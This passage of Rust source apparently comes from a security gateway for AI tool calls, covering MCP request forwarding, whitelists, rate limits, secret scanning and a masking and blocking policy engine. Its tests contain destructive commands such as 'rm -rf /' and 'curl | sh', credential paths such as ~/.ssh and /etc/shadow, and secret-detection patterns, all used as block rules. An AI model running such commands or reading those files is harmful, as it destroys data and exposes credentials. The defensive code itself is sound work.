                    warn!("Rate limit exceeded: {}", err);
                    let resp = McpResponse::error(mcp_req.id.clone(), -32002, err.to_string());
                    return Ok(json_response(StatusCode::TOO_MANY_REQUESTS, &resp));
                }
            }
        }
    }

    // Scan the request body for sensitive data
    let findings = scanner.scan(&body_str);
    if !findings.is_empty() {
        info!(
            "Scan found {} findings in MCP request (method: {})",
            findings.len(),
            mcp_req.method
        );
    }

    // Find the target server from the request params
    let server_name = mcp_req
        .params
        .as_ref()
        .and_then(|p| p.get("server_name"))
        .and_then(|v| v.as_str())
        .unwrap_or("");

    let server_entry = config.server_whitelist.get(server_name);

    // If we have a server entry with an endpoint, forward upstream
    if let Some(entry) = server_entry {
        let connector = hyper_util::client::legacy::connect::HttpConnector::new();
        let client =
            hyper_util::client::legacy::Client::builder(hyper_util::rt::TokioExecutor::new())
                .build(connector);

        let upstream_req = match hyper::Request::builder()
            .method(hyper::Method::POST)
            .uri(&entry.endpoint)
            .header("content-type", "application/json")
            .body(Full::new(Bytes::from(body_str.to_string())))
        {
            Ok(req) => req,
            Err(e) => {
                error!("Failed to build upstream request: {}", e);
                let resp = McpResponse::error(
                    mcp_req.id.clone(),
                    -32003,
                    format!("Failed to build upstream request: {}", e),
                );
                return Ok(json_response(StatusCode::INTERNAL_SERVER_ERROR, &resp));
            }
        };

        match client.request(upstream_req).await {
            Ok(upstream_resp) => {
                let resp_body = match upstream_resp.collect().await {
                    Ok(collected) => collected.to_bytes(),
                    Err(e) => {
                        error!("Failed to read upstream response: {}", e);
                        let resp = McpResponse::error(
                            mcp_req.id.clone(),
                            -32003,
                            format!("Upstream response read error: {}", e),
                        );
                        return Ok(json_response(StatusCode::BAD_GATEWAY, &resp));
                    }
                };

                // Scan response for sensitive data
                let resp_str = String::from_utf8_lossy(&resp_body);
                if entry.scan_responses {
                    let resp_findings = scanner.scan(&resp_str);
                    if !resp_findings.is_empty() {
                        warn!(
                            target: "eidra::mcp",
                            findings = resp_findings.len(),
                            "sensitive data detected in MCP upstream response"
                        );
                    }
                }

                // Pass through the upstream response as-is
                Ok(Response::builder()
                    .status(StatusCode::OK)
                    .header("Content-Type", "application/json")
                    .body(Full::new(resp_body))
                    .unwrap_or_else(|_| {
                        Response::new(Full::new(Bytes::from(
                            r#"{"jsonrpc":"2.0","error":{"code":-32603,"message":"Internal error"}}"#,
                        )))
                    }))
            }
            Err(e) => {
                error!("Upstream request failed: {}", e);
                let resp = McpResponse::error(
                    mcp_req.id.clone(),
                    -32003,
                    format!("Upstream connection error: {}", e),
                );
                Ok(json_response(StatusCode::BAD_GATEWAY, &resp))
            }
        }
    } else {
        // No server entry found or no server_name — return validated response
        let result = serde_json::json!({
            "status": "validated",
            "method": mcp_req.method,
            "findings_count": findings.len(),
            "message": "Request passed gateway validation. No upstream server configured."
        });
        let resp = McpResponse::success(mcp_req.id, result);
        Ok(json_response(StatusCode::OK, &resp))
    }
}

/// Build an HTTP response with JSON body.
fn json_response(status: StatusCode, body: &McpResponse) -> Response<Full<Bytes>> {
    let json = serde_json::to_string(body).unwrap_or_else(|_| {
        r#"{"jsonrpc":"2.0","error":{"code":-32603,"message":"Internal error"}}"#.to_string()
    });

    Response::builder()
        .status(status)
        .header("Content-Type", "application/json")
        .body(Full::new(Bytes::from(json)))
        .unwrap_or_else(|_| {
            Response::new(Full::new(Bytes::from(
                r#"{"jsonrpc":"2.0","error":{"code":-32603,"message":"Internal error"}}"#,
            )))
        })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::McpServerEntry;

    fn test_gateway() -> McpGateway {
        let mut whitelist = HashMap::new();
        whitelist.insert(
            "test-server".to_string(),
            McpServerEntry {
                name: "test-server".to_string(),
                endpoint: "http://localhost:9000".to_string(),
                enabled: true,
                allowed_tools: vec![],
                blocked_tools: vec![],
                rate_limit: 10,
                scan_responses: true,
                tool_rules: vec![],
                metadata: HashMap::new(),
            },
        );

        let config = McpGatewayConfig {
            enabled: true,
            listen: "127.0.0.1:0".to_string(),
            server_whitelist: whitelist,
            global_rate_limit: 60,
            metadata: HashMap::new(),
        };

        McpGateway::new(config, Arc::new(Scanner::with_defaults()))
    }

    #[test]
    fn test_rate_limit_allows_within_limit() {
        let gw = test_gateway();
        let result = check_rate_limit(&gw.rate_limits, "test-server", 10);
        assert!(result.is_ok());
    }

    #[test]
    fn test_rate_limit_blocks_over_limit() {
        let gw = test_gateway();
        for _ in 0..10 {
            check_rate_limit(&gw.rate_limits, "test-server", 10).unwrap();
        }
        let result = check_rate_limit(&gw.rate_limits, "test-server", 10);
        assert!(result.is_err());
        match result.unwrap_err() {
            McpError::RateLimitExceeded { server, limit } => {
                assert_eq!(server, "test-server");
                assert_eq!(limit, 10);
            }
            other => panic!("Expected RateLimitExceeded, got: {:?}", other),
        }
    }

    #[test]
    fn test_rate_limit_zero_means_unlimited() {
        let gw = test_gateway();
        for _ in 0..1000 {
            assert!(check_rate_limit(&gw.rate_limits, "test-server", 0).is_ok());
        }
    }

    #[test]
    fn test_gateway_new() {
        let gw = test_gateway();
        assert!(gw.config.enabled);
        assert_eq!(gw.config.server_whitelist.len(), 1);
    }
}
```

### crates/eidra-mcp/src/handler.rs
```rust
use regex::Regex;
use serde::{Deserialize, Serialize};

use crate::config::McpGatewayConfig;
use crate::error::McpError;

/// A JSON-RPC request conforming to the MCP protocol.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpRequest {
    /// JSON-RPC version, must be "2.0".
    pub jsonrpc: String,

    /// The method being called (e.g., "tools/call", "tools/list").
    pub method: String,

    /// Optional parameters for the method.
    #[serde(default)]
    pub params: Option<serde_json::Value>,

    /// Optional request ID for correlation.
    #[serde(default)]
    pub id: Option<serde_json::Value>,
}

/// A JSON-RPC error object.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpRpcError {
    /// Error code.
    pub code: i64,

    /// Human-readable error message.
    pub message: String,

    /// Optional additional data.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub data: Option<serde_json::Value>,
}

/// A JSON-RPC response conforming to the MCP protocol.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpResponse {
    /// JSON-RPC version, always "2.0".
    pub jsonrpc: String,

    /// The result, present on success.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub result: Option<serde_json::Value>,

    /// The error, present on failure.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub error: Option<McpRpcError>,

    /// Request ID for correlation.
    #[serde(default)]
    pub id: Option<serde_json::Value>,
}

impl McpResponse {
    /// Create a success response.
    pub fn success(id: Option<serde_json::Value>, result: serde_json::Value) -> Self {
        Self {
            jsonrpc: "2.0".to_string(),
            result: Some(result),
            error: None,
            id,
        }
    }

    /// Create an error response.
    pub fn error(id: Option<serde_json::Value>, code: i64, message: String) -> Self {
        Self {
            jsonrpc: "2.0".to_string(),
            result: None,
            error: Some(McpRpcError {
                code,
                message,
                data: None,
            }),
            id,
        }
    }
}

/// Extract server_name and tool_name from a "tools/call" request's params.
///
/// Expects params like:
/// ```json
/// { "server_name": "filesystem", "name": "read_file", "arguments": { ... } }
/// ```
fn extract_tool_call_info(params: &serde_json::Value) -> Option<(String, String)> {
    let server_name = params.get("server_name")?.as_str()?.to_string();
    let tool_name = params.get("name")?.as_str()?.to_string();
    Some((server_name, tool_name))
}

/// Validate an incoming MCP request against the gateway configuration.
///
/// Checks:
/// 1. Gateway is enabled
/// 2. For "tools/call" requests: server is whitelisted, enabled, and tool is allowed
///
/// Returns `Ok(())` if the request is allowed, or an appropriate `McpError`.
pub fn validate_request(config: &McpGatewayConfig, req: &McpRequest) -> Result<(), McpError> {
    // Check if gateway is enabled
    if !config.enabled {
        return Err(McpError::GatewayDisabled);
    }

    // Only apply tool-level ACL for "tools/call" method
    if req.method == "tools/call" {
        if let Some(ref params) = req.params {
            if let Some((server_name, tool_name)) = extract_tool_call_info(params) {
                // Check server whitelist
                let server_entry = config.server_whitelist.get(&server_name).ok_or_else(|| {
                    McpError::ServerNotWhitelisted {
                        server: server_name.clone(),
                    }
                })?;

                // Check server is enabled
                if !server_entry.enabled {
                    return Err(McpError::ServerDisabled {
                        server: server_name,
                    });
                }

                // Check blocked tools (takes precedence)
                if server_entry.blocked_tools.contains(&tool_name) {
                    return Err(McpError::ToolBlocked {
                        server: server_name,
                        tool: tool_name,
                    });
                }

                // Check allowed tools (empty means all allowed)
                if !server_entry.allowed_tools.is_empty()
                    && !server_entry.allowed_tools.contains(&tool_name)
                {
                    return Err(McpError::ToolNotAllowed {
                        server: server_name,
                        tool: tool_name,
                    });
                }
            }
        }
    }

    Ok(())
}

/// Validate tool call arguments against semantic rules.
///
/// Inspects the serialized arguments of a tool call and checks them against
/// the `tool_rules` configured for the given server. This enables blocking
/// destructive SQL, sensitive file paths, dangerous shell commands, and
/// secrets embedded in any tool arguments.
///
/// Returns `Ok(())` if allowed, or `Err(McpError::SemanticPolicyViolation)` if blocked.
pub fn validate_tool_arguments(
    config: &McpGatewayConfig,
    server_name: &str,
    tool_name: &str,
    arguments: &serde_json::Value,
) -> Result<(), McpError> {
    let server = config.server_whitelist.get(server_name);
    let server = match server {
        Some(s) => s,
        None => return Ok(()), // No server config = no rules
    };

    // Find matching tool rules
    for rule in &server.tool_rules {
        if rule.tool != tool_name && rule.tool != "*" {
            continue;
        }

        let args_str = arguments.to_string();

        // Check block_patterns (regex match on serialized arguments)
        for pattern in &rule.block_patterns {
            let re = Regex::new(pattern).map_err(|e| {
                McpError::ConfigError(format!("invalid regex '{}': {}", pattern, e))
            })?;
            if re.is_match(&args_str) {
                return Err(McpError::SemanticPolicyViolation {
                    tool: tool_name.to_string(),
                    rule: rule.description.clone(),
                    matched_pattern: pattern.clone(),
                });
            }
        }

        // Check blocked_paths (for file/path arguments)
        if !rule.blocked_paths.is_empty() {
            check_path_access(
                tool_name,
                arguments,
                &rule.blocked_paths,
                &rule.allowed_paths,
            )?;
        }
    }

    Ok(())
}

/// Check whether any path-like strings in the arguments match blocked path patterns.
///
/// If a path matches a blocked pattern, it is still allowed if it also matches
/// an `allowed_paths` entry (allow takes precedence over block for paths).
fn check_path_access(
    tool_name: &str,
    arguments: &serde_json::Value,
    blocked_paths: &[String],
    allowed_paths: &[String],
) -> Result<(), McpError> {
    let paths = extract_paths(arguments);

    for path in &paths {
        for blocked in blocked_paths {
            if glob_match(blocked, path) {
                // Check if explicitly allowed
                let is_allowed = allowed_paths.iter().any(|a| glob_match(a, path));
                if !is_allowed {
                    return Err(McpError::SemanticPolicyViolation {
                        tool: tool_name.to_string(),
                        rule: format!("path '{}' matches blocked pattern '{}'", path, blocked),
                        matched_pattern: blocked.clone(),
                    });
                }
            }
        }
    }
    Ok(())
}

/// Extract path-like strings from JSON arguments.
///
/// Looks for string values that start with `/`, `~/`, `./`, or contain `..`.
/// Also extracts values from keys commonly used for file paths
/// (`path`, `file`, `filename`, `directory`).
fn extract_paths(value: &serde_json::Value) -> Vec<String> {
    let mut paths = Vec::new();
    match value {
        serde_json::Value::String(s) => {
            if s.starts_with('/') || s.starts_with("~/") || s.starts_with("./") || s.contains("..")
            {
                paths.push(s.clone());
            }
        }
        serde_json::Value::Object(map) => {
            for (key, val) in map {
                if key == "path" || key == "file" || key == "filename" || key == "directory" {
                    if let Some(s) = val.as_str() {
                        paths.push(s.to_string());
                    }
                }
                paths.extend(extract_paths(val));
            }
        }
        serde_json::Value::Array(arr) => {
            for item in arr {
                paths.extend(extract_paths(item));
            }
        }
        _ => {}
    }
    paths
}

/// Simple glob matching for path patterns.
///
/// Supports:
/// - `**` — matches any path (prefix match up to `**`)
/// - Trailing `*` — prefix match
/// - `~` expansion to `$HOME`
/// - Exact match otherwise
fn glob_match(pattern: &str, path: &str) -> bool {
    if pattern == "**" {
        return true;
    }
    let home = std::env::var("HOME").unwrap_or_default();
    let pattern = pattern.replace('~', &home);
    let path_expanded = path.replace('~', &home);

    if pattern.contains("**") {
        let prefix = pattern.split("**").next().unwrap_or("");
        return path_expanded.starts_with(prefix);
    }
    if pattern.ends_with('*') {
        let prefix = &pattern[..pattern.len() - 1];
        return path_expanded.starts_with(prefix);
    }
    path_expanded == pattern
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{McpGatewayConfig, McpServerEntry, McpToolRule};
    use std::collections::HashMap;

    /// Helper to build a test config with one server.
    fn test_config(
        enabled: bool,
        server_name: &str,
        allowed_tools: Vec<String>,
        blocked_tools: Vec<String>,
    ) -> McpGatewayConfig {
        let mut whitelist = HashMap::new();
        whitelist.insert(
            server_name.to_string(),
            McpServerEntry {
                name: server_name.to_string(),
                endpoint: "http://localhost:9000".to_string(),
                enabled: true,
                allowed_tools,
                blocked_tools,
                rate_limit: 0,
                scan_responses: true,
                tool_rules: vec![],
                metadata: HashMap::new(),
            },
        );
        McpGatewayConfig {
            enabled,
            listen: "127.0.0.1:8081".to_string(),
            server_whitelist: whitelist,
            global_rate_limit: 0,
            metadata: HashMap::new(),
        }
    }

    fn tools_call_request(server_name: &str, tool_name: &str) -> McpRequest {
        McpRequest {
            jsonrpc: "2.0".to_string(),
            method: "tools/call".to_string(),
            params: Some(serde_json::json!({
                "server_name": server_name,
                "name": tool_name,
                "arguments": {}
            })),
            id: Some(serde_json::json!(1)),
        }
    }

    #[test]
    fn test_validate_allowed_tool() {
        let config = test_config(true, "filesystem", vec![], vec![]);
        let req = tools_call_request("filesystem", "read_file");
        assert!(validate_request(&config, &req).is_ok());
    }

    #[test]
    fn test_validate_blocked_tool() {
        let config = test_config(true, "filesystem", vec![], vec!["delete_file".to_string()]);
        let req = tools_call_request("filesystem", "delete_file");
        let err = validate_request(&config, &req).unwrap_err();
        match err {
            McpError::ToolBlocked { server, tool } => {
                assert_eq!(server, "filesystem");
                assert_eq!(tool, "delete_file");
            }
            other => panic!("Expected ToolBlocked, got: {:?}", other),
        }
    }

    #[test]
    fn test_validate_unknown_server() {
        let config = test_config(true, "filesystem", vec![], vec![]);
        let req = tools_call_request("unknown_server", "read_file");
        let err = validate_request(&config, &req).unwrap_err();
        match err {
            McpError::ServerNotWhitelisted { server } => {
                assert_eq!(server, "unknown_server");
            }
            other => panic!("Expected ServerNotWhitelisted, got: {:?}", other),
        }
    }

    #[test]
    fn test_validate_tool_not_in_allowed_list() {
        let config = test_config(true, "filesystem", vec!["read_file".to_string()], vec![]);
        let req = tools_call_request("filesystem", "write_file");
        let err = validate_request(&config, &req).unwrap_err();
        match err {
            McpError::ToolNotAllowed { server, tool } => {
                assert_eq!(server, "filesystem");
                assert_eq!(tool, "write_file");
            }
            other => panic!("Expected ToolNotAllowed, got: {:?}", other),
        }
    }

    #[test]
    fn test_validate_gateway_disabled() {
        let config = test_config(false, "filesystem", vec![], vec![]);
        let req = tools_call_request("filesystem", "read_file");
        let err = validate_request(&config, &req).unwrap_err();
        assert!(matches!(err, McpError::GatewayDisabled));
    }

    #[test]
    fn test_validate_non_tool_call_passes() {
        let config = test_config(true, "filesystem", vec![], vec![]);
        let req = McpRequest {
            jsonrpc: "2.0".to_string(),
            method: "tools/list".to_string(),
            params: None,
            id: Some(serde_json::json!(1)),
        };
        assert!(validate_request(&config, &req).is_ok());
    }

    #[test]
    fn test_blocked_takes_precedence_over_allowed() {
        let config = test_config(
            true,
            "filesystem",
            vec!["delete_file".to_string()],
            vec!["delete_file".to_string()],
        );
        let req = tools_call_request("filesystem", "delete_file");
        let err = validate_request(&config, &req).unwrap_err();
        assert!(matches!(err, McpError::ToolBlocked { .. }));
    }

    #[test]
    fn test_server_disabled() {
        let mut config = test_config(true, "filesystem", vec![], vec![]);
        config
            .server_whitelist
            .get_mut("filesystem")
            .unwrap()
            .enabled = false;
        let req = tools_call_request("filesystem", "read_file");
        let err = validate_request(&config, &req).unwrap_err();
        assert!(matches!(err, McpError::ServerDisabled { .. }));
    }

    // --- Semantic RBAC tests ---

    /// Helper to build a config with semantic tool rules on a given server.
    fn make_config_with_rules(server_name: &str, rules: Vec<McpToolRule>) -> McpGatewayConfig {
        let mut whitelist = HashMap::new();
        whitelist.insert(
            server_name.to_string(),
            McpServerEntry {
                name: server_name.to_string(),
                endpoint: "http://localhost:9000".to_string(),
                enabled: true,
                allowed_tools: vec![],
                blocked_tools: vec![],
                rate_limit: 0,
                scan_responses: true,
                tool_rules: rules,
                metadata: HashMap::new(),
            },
        );
        McpGatewayConfig {
            enabled: true,
            listen: "127.0.0.1:8081".to_string(),
            server_whitelist: whitelist,
            global_rate_limit: 0,
            metadata: HashMap::new(),
        }
    }

    #[test]
    fn test_semantic_block_destructive_sql() {
        let config = make_config_with_rules(
            "db_server",
            vec![McpToolRule {
                tool: "execute_sql".to_string(),
                block_patterns: vec![r"(?i)\b(DROP|DELETE|TRUNCATE|ALTER)\b".to_string()],
                blocked_paths: vec![],
                allowed_paths: vec![],
                description: "Block destructive SQL".to_string(),
            }],
        );

        let args = serde_json::json!({"query": "DROP TABLE users"});
        let result = validate_tool_arguments(&config, "db_server", "execute_sql", &args);
        assert!(result.is_err());
        match result.unwrap_err() {
            McpError::SemanticPolicyViolation { tool, rule, .. } => {
                assert_eq!(tool, "execute_sql");
                assert_eq!(rule, "Block destructive SQL");
            }
            other => panic!("Expected SemanticPolicyViolation, got: {:?}", other),
        }

        let args = serde_json::json!({"query": "SELECT * FROM users"});
        let result = validate_tool_arguments(&config, "db_server", "execute_sql", &args);
        assert!(result.is_ok());
    }

    #[test]
    fn test_semantic_block_sensitive_path() {
        let config = make_config_with_rules(
            "fs_server",
            vec![McpToolRule {
                tool: "read_file".to_string(),
                block_patterns: vec![],
                blocked_paths: vec![
                    "~/.ssh/**".to_string(),
                    "~/.aws/**".to_string(),
                    "/etc/shadow".to_string(),
                ],
                allowed_paths: vec![],
                description: "Block sensitive paths".to_string(),
            }],
        );

        let args = serde_json::json!({"path": "/etc/shadow"});
        let result = validate_tool_arguments(&config, "fs_server", "read_file", &args);
        assert!(result.is_err());

        let args = serde_json::json!({"path": "/home/user/code/main.rs"});
        let result = validate_tool_arguments(&config, "fs_server", "read_file", &args);
        assert!(result.is_ok());
    }

    #[test]
    fn test_semantic_block_destructive_command() {
        let config = make_config_with_rules(
            "shell",
            vec![McpToolRule {
                tool: "run_command".to_string(),
                block_patterns: vec![
                    r"rm\s+(-rf?|--recursive)".to_string(),
                    r"curl.*\|\s*(sh|bash)".to_string(),
                    r"chmod\s+777".to_string(),
                ],
                blocked_paths: vec![],
                allowed_paths: vec![],
                description: "Block destructive commands".to_string(),
            }],
        );

        let args = serde_json::json!({"command": "rm -rf /"});
        let result = validate_tool_arguments(&config, "shell", "run_command", &args);
        assert!(result.is_err());

        let args = serde_json::json!({"command": "ls -la"});
        let result = validate_tool_arguments(&config, "shell", "run_command", &args);
        assert!(result.is_ok());
    }

    #[test]
    fn test_semantic_wildcard_rule_applies_to_all_tools() {
        let config = make_config_with_rules(
            "any_server",
            vec![McpToolRule {
                tool: "*".to_string(),
                block_patterns: vec![
                    r#"(?i)(password|secret|token|api.?key)\s*[:=]\s*['"]?[A-Za-z0-9]{8,}"#
                        .to_string(),
                ],
                blocked_paths: vec![],
                allowed_paths: vec![],
                description: "Block secrets in any tool arguments".to_string(),
            }],
        );

        let args = serde_json::json!({"data": "my api_key=ABCDEF1234567890"});
        let result = validate_tool_arguments(&config, "any_server", "some_tool", &args);
        assert!(result.is_err());

        let args = serde_json::json!({"data": "hello world"});
        let result = validate_tool_arguments(&config, "any_server", "some_tool", &args);
        assert!(result.is_ok());
    }

    #[test]
    fn test_semantic_allowed_path_overrides_blocked() {
        let config = make_config_with_rules(
            "fs_server",
            vec![McpToolRule {
                tool: "read_file".to_string(),
                block_patterns: vec![],
                blocked_paths: vec!["/etc/**".to_string()],
                allowed_paths: vec!["/etc/hostname".to_string()],
                description: "Block /etc except hostname".to_string(),
            }],
        );

        // /etc/shadow is blocked
        let args = serde_json::json!({"path": "/etc/shadow"});
        let result = validate_tool_arguments(&config, "fs_server", "read_file", &args);
        assert!(result.is_err());

        // /etc/hostname is explicitly allowed
        let args = serde_json::json!({"path": "/etc/hostname"});
        let result = validate_tool_arguments(&config, "fs_server", "read_file", &args);
        assert!(result.is_ok());
    }

    #[test]
    fn test_semantic_no_rules_passes() {
        let config = make_config_with_rules("server", vec![]);
        let args = serde_json::json!({"query": "DROP TABLE users"});
        let result = validate_tool_arguments(&config, "server", "execute_sql", &args);
        assert!(result.is_ok());
    }

    #[test]
    fn test_semantic_unknown_server_passes() {
        let config = make_config_with_rules("known_server", vec![]);
        let args = serde_json::json!({"query": "DROP TABLE users"});
        let result = validate_tool_arguments(&config, "unknown_server", "execute_sql", &args);
        assert!(result.is_ok());
    }

    #[test]
    fn test_extract_paths_from_nested_json() {
        let val = serde_json::json!({
            "options": {
                "path": "/etc/passwd",
                "other": "not a path"
            }
        });
        let paths = extract_paths(&val);
        assert!(paths.contains(&"/etc/passwd".to_string()));
        assert!(!paths.contains(&"not a path".to_string()));
    }

    #[test]
    fn test_extract_paths_from_array() {
        let val = serde_json::json!({
            "files": [
                {"path": "/tmp/a.txt"},
                {"file": "/var/log/b.log"}
            ]
        });
        let paths = extract_paths(&val);
        assert!(paths.contains(&"/tmp/a.txt".to_string()));
        assert!(paths.contains(&"/var/log/b.log".to_string()));
    }

    #[test]
    fn test_glob_match_exact() {
        assert!(glob_match("/etc/shadow", "/etc/shadow"));
        assert!(!glob_match("/etc/shadow", "/etc/passwd"));
    }

    #[test]
    fn test_glob_match_wildcard() {
        assert!(glob_match("/etc/*", "/etc/shadow"));
        assert!(!glob_match("/etc/*", "/var/log/syslog"));
    }

    #[test]
    fn test_glob_match_double_star() {
        assert!(glob_match("/etc/**", "/etc/shadow"));
        assert!(glob_match("/etc/**", "/etc/ssl/certs/ca.pem"));
        assert!(!glob_match("/etc/**", "/var/log/syslog"));
    }
}
```

### crates/eidra-mcp/src/lib.rs
```rust
pub mod config;
pub mod error;
pub mod gateway;
pub mod handler;
```

### crates/eidra-policy/src/engine.rs
```rust
use crate::types::{MatchConditions, PolicyAction, PolicyConfig, PolicyContext};
use eidra_scan::findings::Finding;

/// Result of policy evaluation for a single finding.
#[derive(Debug, Clone)]
pub struct PolicyDecision {
    pub finding: Finding,
    pub action: PolicyAction,
    pub matched_rule: Option<String>,
}

/// Result of evaluating all findings in a request.
#[derive(Debug)]
pub struct RequestDecision {
    pub overall_action: PolicyAction,
    pub decisions: Vec<PolicyDecision>,
}

pub struct PolicyEngine {
    config: PolicyConfig,
}

impl PolicyEngine {
    pub fn new(config: PolicyConfig) -> Self {
        Self { config }
    }

    /// Evaluate a single finding against the policy rules.
    /// First match wins (top-to-bottom).
    pub fn evaluate_finding(&self, finding: &Finding, destination: &str) -> PolicyDecision {
        for rule in &self.config.rules {
            if matches_conditions(&rule.match_conditions, finding, destination) {
                return PolicyDecision {
                    finding: finding.clone(),
                    action: rule.action.clone(),
                    matched_rule: Some(rule.name.clone()),
                };
            }
        }
        PolicyDecision {
            finding: finding.clone(),
            action: self.config.default_action.clone(),
            matched_rule: None,
        }
    }

    /// Evaluate all findings for a request and determine the overall action.
    /// The most restrictive action wins: Block > Mask > Escalate > Route > Allow.
    pub fn evaluate(&self, ctx: &PolicyContext<'_>) -> RequestDecision {
        let decisions: Vec<PolicyDecision> = ctx
            .findings
            .iter()
            .map(|f| self.evaluate_finding(f, ctx.destination))
            .collect();

        let overall_action = decisions
            .iter()
            .map(|d| &d.action)
            .max_by_key(|a| action_severity(a))
            .cloned()
            .unwrap_or_else(|| self.config.default_action.clone());

        RequestDecision {
            overall_action,
            decisions,
        }
    }
}

fn action_severity(action: &PolicyAction) -> u8 {
    match action {
        PolicyAction::Allow => 0,
        PolicyAction::Route(_) => 1,
        PolicyAction::Escalate => 2,
        PolicyAction::Mask => 3,
        PolicyAction::Block => 4,
        PolicyAction::Custom(_) => 2,
    }
}

fn matches_conditions(conditions: &MatchConditions, finding: &Finding, destination: &str) -> bool {
    if let Some(ref sev) = conditions.severity {
        let finding_sev = finding.severity.to_string().to_lowercase();
        if finding_sev != sev.to_lowercase() {
            return false;
        }
    }
    if let Some(ref cat) = conditions.category {
        let finding_cat = finding.category.to_string().to_lowercase();
        if finding_cat != cat.to_lowercase() {
            return false;
        }
    }
    if let Some(ref dest) = conditions.destination {
        let dest_lower = dest.to_lowercase();
        let is_local = destination == "localhost"
            || destination.starts_with("127.")
            || destination.starts_with("local");
        let dest_type = if is_local { "local" } else { "cloud" };
        if dest_lower != dest_type {
            return false;
        }
    }
    if let Some(ref rn) = conditions.rule_name {
        if finding.rule_name != *rn {
            return false;
        }
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::loader::default_policy;
    use eidra_scan::findings::{Category, Finding, Severity};

    fn make_finding(category: Category, severity: Severity, rule_name: &str) -> Finding {
        Finding::new(category, severity, rule_name, "test", "matched", 0, 7)
    }

    #[test]
    fn test_block_private_key() {
        let engine = PolicyEngine::new(default_policy());
        let finding = make_finding(Category::PrivateKey, Severity::Critical, "private_key");
        let decision = engine.evaluate_finding(&finding, "api.openai.com");
        assert_eq!(decision.action, PolicyAction::Block);
    }

    #[test]
    fn test_mask_api_key() {
        let engine = PolicyEngine::new(default_policy());
        let finding = make_finding(Category::ApiKey, Severity::High, "aws_access_key");
        let decision = engine.evaluate_finding(&finding, "api.openai.com");
        assert_eq!(decision.action, PolicyAction::Mask);
    }

    #[test]
    fn test_mask_pii_cloud() {
        let engine = PolicyEngine::new(default_policy());
        let finding = make_finding(Category::Pii, Severity::Medium, "email_address");
        let decision = engine.evaluate_finding(&finding, "api.openai.com");
        assert_eq!(decision.action, PolicyAction::Mask);
    }

    #[test]
    fn test_allow_pii_local() {
        let engine = PolicyEngine::new(default_policy());
        let finding = make_finding(Category::Pii, Severity::Medium, "email_address");
        let decision = engine.evaluate_finding(&finding, "localhost:11434");
        assert_eq!(decision.action, PolicyAction::Allow);
    }

    #[test]
    fn test_allow_clean_request() {
        let engine = PolicyEngine::new(default_policy());
        let ctx = PolicyContext {
            findings: &[],
            destination: "api.openai.com",
            data_size_bytes: 100,
            metadata: std::collections::HashMap::new(),
        };
        let decision = engine.evaluate(&ctx);
        assert_eq!(decision.overall_action, PolicyAction::Allow);
    }

    #[test]
    fn test_overall_most_restrictive() {
        let engine = PolicyEngine::new(default_policy());
        let findings = vec![
            make_finding(Category::ApiKey, Severity::High, "aws_access_key"), // → mask
            make_finding(Category::PrivateKey, Severity::Critical, "private_key"), // → block
        ];
        let ctx = PolicyContext {
            findings: &findings,
            destination: "api.openai.com",
            data_size_bytes: 500,
            metadata: std::collections::HashMap::new(),
        };
        let decision = engine.evaluate(&ctx);
        assert_eq!(decision.overall_action, PolicyAction::Block);
    }
}
```

### crates/eidra-policy/src/error.rs
```rust
use thiserror::Error;

#[derive(Debug, Error)]
pub enum PolicyError {
    #[error("yaml parse error: {0}")]
    YamlParse(#[from] serde_yaml::Error),

    #[error("io error: {0}")]
    Io(#[from] std::io::Error),

    #[error("invalid policy: {0}")]
    Invalid(String),
}
```

### crates/eidra-policy/src/lib.rs
```rust
pub mod engine;
pub mod error;
pub mod loader;
pub mod types;
```

### crates/eidra-policy/src/loader.rs
```rust
use crate::error::PolicyError;
use crate::types::PolicyConfig;
use std::path::Path;

pub fn load_from_str(yaml: &str) -> Result<PolicyConfig, PolicyError> {
    let config: PolicyConfig = serde_yaml::from_str(yaml)?;
    Ok(config)
}

pub fn load_from_file(path: &Path) -> Result<PolicyConfig, PolicyError> {
    let content = std::fs::read_to_string(path)?;
    load_from_str(&content)
}

pub fn default_policy() -> PolicyConfig {
    let yaml = r#"
version: "1"
default_action: allow
rules:
  - name: block_private_keys
    description: "Block requests containing private keys"
    match:
      category: "private_key"
    action: block

  - name: block_critical_secrets
    description: "Block requests with critical severity findings"
    match:
      severity: "critical"
      destination: "cloud"
    action: block

  - name: mask_api_keys
    description: "Mask API keys before sending to cloud"
    match:
      category: "api_key"
    action: mask

  - name: mask_tokens
    description: "Mask tokens before sending to cloud"
    match:
      category: "token"
    action: mask

  - name: mask_credentials
    description: "Mask credentials before sending to cloud"
    match:
      category: "credential"
    action: mask

  - name: mask_secrets
    description: "Mask secret keys before sending"
    match:
      category: "secret_key"
    action: mask

  - name: mask_pii_cloud
    description: "Mask PII when sending to cloud"
    match:
      category: "pii"
      destination: "cloud"
    action: mask

  - name: allow_pii_local
    description: "Allow PII when sending to local LLM"
    match:
      category: "pii"
      destination: "local"
    action: allow
"#;
    load_from_str(yaml).expect("default policy must be valid")
}
```

### crates/eidra-policy/src/types.rs
```rust
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum PolicyAction {
    Allow,
    Mask,
    Block,
    Escalate,
    Route(RouteTarget),
    Custom(String),
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum RouteTarget {
    Local,
    Cloud,
    Custom(String),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PolicyRule {
    pub name: String,
    #[serde(default)]
    pub description: String,
    #[serde(rename = "match")]
    pub match_conditions: MatchConditions,
    pub action: PolicyAction,
    #[serde(default)]
    pub metadata: HashMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct MatchConditions {
    #[serde(default)]
    pub severity: Option<String>,
    #[serde(default)]
    pub category: Option<String>,
    #[serde(default)]
    pub destination: Option<String>,
    #[serde(default)]
    pub rule_name: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PolicyConfig {
    #[serde(default = "default_version")]
    pub version: String,
    #[serde(default)]
    pub rules: Vec<PolicyRule>,
